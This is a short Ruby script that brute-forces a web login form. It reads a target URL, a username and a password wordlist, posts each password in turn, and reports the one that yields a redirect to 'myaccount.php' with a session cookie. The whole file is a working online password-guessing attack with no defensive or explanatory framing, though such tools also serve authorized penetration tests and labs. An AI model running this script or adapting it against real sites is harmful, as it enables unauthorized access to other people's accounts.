require 'net/http'

Target = ARGV[0]
User = ARGV[1]
Password_file = ARGV[2]

url = URI(Target)
params = {"user"=>User}
http = Net::HTTP.start(url.hostname)
req = Net::HTTP::Post.new(url.request_uri)

File.open(Password_file,'r') do |file|	
	real_pwd = file.each do	|pwd|
		params['pass']=pwd.chop
		req.set_form_data(params)
		res = http.request(req)
		break pwd if (res['location']=='myaccount.php' && res['set-cookie'])
	end
	puts "\nPassword for '"+User+"' is: "+real_pwd if real_pwd.is_a?String
end

http.finish
